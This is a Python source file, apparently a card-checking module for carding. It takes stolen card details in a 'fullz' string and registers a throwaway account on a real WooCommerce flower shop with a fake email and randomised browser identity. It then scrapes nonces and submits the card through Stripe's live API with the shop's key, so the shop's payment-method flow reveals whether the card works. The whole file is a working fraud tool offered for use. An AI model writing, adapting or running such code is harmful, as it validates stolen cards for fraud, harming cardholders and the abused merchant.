import base64
import json
import random
import re
import string
import time
from fake_useragent import UserAgent
from FUNC.usersdb_func import *
from FUNC.defs import *
import random
import string
import re
from bs4 import BeautifulSoup
import json
import time
import base64
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import unquote
from urllib.parse import urlparse, parse_qs

def gets(s, start, end):
            try:
                start_index = s.index(start) + len(start)
                end_index = s.index(end, start_index)
                return s[start_index:end_index]
            except ValueError:
                return None



async def create_cvv_auth(fullz , session):
    try:

        cc, mes, ano, cvv = fullz.split("|")


        mail= "criehs4d"+str(random.randint(584, 5658))+"@gamil.com"
        user = f"Mozilla/5.0 (Windows NT {random.randint(11, 99)}.0; Win64; x64) AppleWebKit/{random.randint(111, 999)}.{random.randint(11, 99)} (KHTML, like Gecko) Chrome/{random.randint(11, 99)}.0.{random.randint(1111, 9999)}.{random.randint(111, 999)} Safari/{random.randint(111, 999)}.{random.randint(11, 99)}"
        url="5thaveflowers.com"





        headers = {
            'User-Agent': user,
    
        }

        response = await session.get(f'https://{url}/my-account/', headers=headers)
        
        
        register_nonce = gets(response.text,'<input type="hidden" id="woocommerce-register-nonce" name="woocommerce-register-nonce" value="','" />')
        print(register_nonce)


        headers = {
            'Origin': f'https://{url}',
            'Referer': f'https://{url}/my-account/',
            'User-Agent': user
        }

        data = {
            'email': mail,
            'password': '#Hackme12',
            'woocommerce-register-nonce': register_nonce,
            '_wp_http_referer': '/my-account/',
            'register': 'Register',
        }

        response = await session.post(f'https://{url}/my-account/', headers=headers, data=data)

        headers = {
            'Referer': f'https://{url}/my-account/',
            'User-Agent': user
        }

        response = await session.get(f'https://{url}/my-account/', headers=headers)

        headers = {
            'Referer': f'https://{url}/my-account/',

            'User-Agent': user

        }

        response = await session.get(f'https://{url}/my-account/payment-methods/', headers=headers)
        add_card_nonce=gets(response.text,'"add_card_nonce":"','","')
        print(add_card_nonce)

        

        headers = {
           
            'Referer': f'https://{url}/my-account/payment-methods/',
        
            'User-Agent': user

        }

        response = await session.get(f'https://{url}/my-account/add-payment-method/', headers=headers)
        add = gets(response.text,'<input type="hidden" id="woocommerce-add-payment-method-nonce" name="woocommerce-add-payment-method-nonce" value="','"/>')
       # print(response.text)


        headers = {
          
            'origin': 'https://js.stripe.com',
           
            'referer': 'https://js.stripe.com/',
            
            'user-agent': user,
        }
        data = {
  'referrer':f'https://{url}',
  'type':'card',
  'owner[name]':' ',
  'owner[email]':mail,
  'card[number]':f'{cc}',
  'card[cvc]':f'{cvv}',
  'card[exp_month]':f'{mes}',
  'card[exp_year]':f'{ano}',
  'guid':'6b143fe9-7ae2-46eb-af8a-f428ae88f889d11233',
  'muid':'70a82fad-b38a-4cb0-889b-64151d10b62ab1c2ec',
  'sid':'4feaef1a-1a8d-4ae7-8575-954166d3acebb67e3c',
  'pasted_fields':'number',
  'payment_user_agent':'stripe.js/81cb80e68b; stripe-js-v3/81cb80e68b; split-card-element',
  'key':'pk_live_Yc0v2niVjjFog9egy0Uv8fnd'
}

        response = await session.post('https://api.stripe.com/v1/sources', headers=headers, data=data)
        print (response.text)
        try:
             id=response.json()['id']
             print (id)
        except:
             return response.text 
      #  print (id)

        headers = {

            'Origin': f'https://{url}',
            
            'Referer': f'https://{url}/my-account/add-payment-method/',
            
            'User-Agent': user
        }

        params = {
            'wc-ajax': 'wc_stripe_create_setup_intent',
        }

        data = {
            'stripe_source_id': id,
            'nonce': add_card_nonce,
        }

        response = await session.post(f'https://{url}/', params=params, headers=headers, data=data)

        # response = await session.post(
        #     f"https://{url}/my-account/add-payment-method/",
        #     headers=head9,
        # )

        print (response.text)



        response=response.text

        # print(response)



        # pattern = re.compile(r'<div class="message-container container alert-color medium-text-center">.*?</div>', re.DOTALL)
        # match = pattern.search(response.text)

        # # Check if a match was found and print it
        # if match:
        #     result = match.group(0)
        #     print(result)
        # else:
        #     print("No match found")

        return response



    except Exception as e:
        return str(e)
